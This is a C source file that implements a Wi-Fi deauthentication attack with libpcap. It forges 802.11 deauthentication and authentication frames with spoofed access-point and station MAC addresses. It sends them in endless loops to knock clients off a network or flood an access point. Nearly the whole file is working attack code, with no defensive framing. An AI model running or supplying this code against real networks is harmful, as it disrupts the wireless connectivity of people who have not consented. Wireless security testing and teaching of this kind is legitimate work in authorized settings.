#include <stdio.h>
#include <pcap.h>
#include <stdlib.h> // for calloc
#include <string.h> // for strcpy
#include <unistd.h> // for usleep
#include <time.h>

#include "Frame.h"

typedef struct ieee80211_MngFrame Frame;
typedef struct ieee80211_AuthFixParam AuthFixParam;
typedef struct ieee08211_deAuthFixParam deAuthFixParam;

void createFrame(Frame* frame, uint16_t frame_ctl, const char* addr1, const char* addr2, const char* addr3);


int deauth_attack_broadcast(const char* interface, const char* ap_mac) {

    printf("ap_mac: %s\n", ap_mac);
    uint8_t ap[6];

    int tmp[6];
    sscanf(ap_mac, "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    for(int i=0; i<6; i++)
        ap[i] = (uint8_t)tmp[i];

    printf("ap: %x %x %x %x %x %x\n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);

    Frame* frame = calloc(sizeof(Frame) + sizeof(deAuthFixParam), 1);
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    // DA: broadcast, SA: AP, BSSID: AP
    createFrame(frame, 0xc000, broadcast, ap, ap);

    // add fix param: deauth reason - unspecified reason (0x0001);
    deAuthFixParam fix_param;
    fix_param.reason_code = 0x0001;
    memcpy((uint8_t*)frame + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));


    char errbuf[PCAP_ERRBUF_SIZE];
    // pcap open live
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}

    // send frame
    while(1) {
        pcap_sendpacket(handle, (unsigned char*)frame, sizeof(Frame) + sizeof(deAuthFixParam));
        puts("send ap's deauth frame to broadcast");
        usleep(500000);
    }

    free(frame);

    return 0;

}


int deauth_attack_station(const char* interface, const char* ap_mac, const char* station_mac) {

    printf("ap_mac: %s\n", ap_mac);
    printf("station_mac: %s\n", station_mac);
    uint8_t ap[6];
    uint8_t sta[6];

    int tmp[6];
    sscanf(ap_mac, "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    for(int i=0; i<6; i++)
        ap[i] = (uint8_t)tmp[i];

    
    sscanf(station_mac, "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    for(int i=0; i<6; i++)
        sta[i] = (uint8_t)tmp[i];

    printf("ap: %x %x %x %x %x %x\n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
    printf("sta: %x %x %x %x %x %x\n", sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);

    Frame* frame_to_ap = calloc(sizeof(Frame) + sizeof(deAuthFixParam), 1);
    Frame* frame_to_sta = calloc(sizeof(Frame) + sizeof(deAuthFixParam), 1);

    // addr1(DA): AP, addr2(SA): Station, addr3(BSSID): AP
    createFrame(frame_to_ap, 0xc000, ap, sta, ap);

    // addr1(DA): Station, addr2(SA): AP, addr3(BSSID): AP
    createFrame(frame_to_sta, 0xc000, sta, ap, ap);

    // add fix param: deauth reason - unspecified reason (0x0001);
    deAuthFixParam fix_param;
    fix_param.reason_code = 0x0007;
    memcpy((uint8_t*)frame_to_ap + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));
    fix_param.reason_code = 0x0007;
    memcpy((uint8_t*)frame_to_sta + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));


    char errbuf[PCAP_ERRBUF_SIZE];
    // pcap open live
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}

    // send frame
    while(1) {
        pcap_sendpacket(handle, (unsigned char*)frame_to_ap, sizeof(Frame) + sizeof(deAuthFixParam));
        pcap_sendpacket(handle, (unsigned char*)frame_to_sta, sizeof(Frame) + sizeof(deAuthFixParam));
        puts("send station's deauth frame to ap");
        puts("send ap's deauth frame to station");
        usleep(50000);
    }

    free(frame_to_ap);
    free(frame_to_sta);

    return 0;

}


int deauth_attack_auth(const char* interface, const char* ap_mac, const char* station_mac) {

    printf("ap_mac: %s\n", ap_mac);
    printf("station_mac: %s\n", station_mac);
    uint8_t ap[6];
    uint8_t sta[6];

    int tmp[6];
    sscanf(ap_mac, "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    for(int i=0; i<6; i++)
        ap[i] = (uint8_t)tmp[i];

    
    sscanf(station_mac, "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    for(int i=0; i<6; i++)
        sta[i] = (uint8_t)tmp[i];

    printf("ap: %x %x %x %x %x %x\n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
    printf("sta: %x %x %x %x %x %x\n", sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);


    Frame* frame = calloc(sizeof(Frame) + sizeof(AuthFixParam), 1);

    // addr1(DA): AP, addr2(SA): Station, addr3(BSSID): AP
    createFrame(frame, 0xb000, ap, sta, ap);

    // add fix param: deauth reason - unspecified reason (0x0001);
    AuthFixParam fix_param;
    fix_param.auth_alg = 0x0000;
    fix_param.auth_seq = 0x0001;
    fix_param.stat_code = 0x0000;
    memcpy((uint8_t*)frame + sizeof(Frame), &fix_param, sizeof(AuthFixParam));

    char errbuf[PCAP_ERRBUF_SIZE];
    // pcap open live
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}

    // send frame
    while(1) {
        pcap_sendpacket(handle, (unsigned char*)frame, sizeof(Frame) + sizeof(AuthFixParam));
        puts("send station's auth frame to ap");
        sleep(1);
    }

    free(frame);

    return 0;
}


void createFrame(Frame* frame, uint16_t frame_ctl, const char* addr1, const char* addr2, const char* addr3) {

    srand(time(NULL));

    // deAuthFrame* frame = calloc(sizeof(deAuthFrame), 1);
    uint8_t radiotap[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};
    memcpy(frame->radiotap, radiotap, 8);
    frame->frame_ctl = htons(frame_ctl);
    // frame->frame_ctl = frame_ctl;
    printf("frame ctl: %02x\n", frame->frame_ctl);
    frame->duartion = 0x0000;

    strncpy(frame->addr1, addr1, 6); // DA
    strncpy(frame->addr2, addr2, 6); // SA
    strncpy(frame->addr3, addr3, 6); // BSSID
    // frame->seq_ctl = 0x0000;
    frame->seq_ctl = (uint16_t)rand();
}

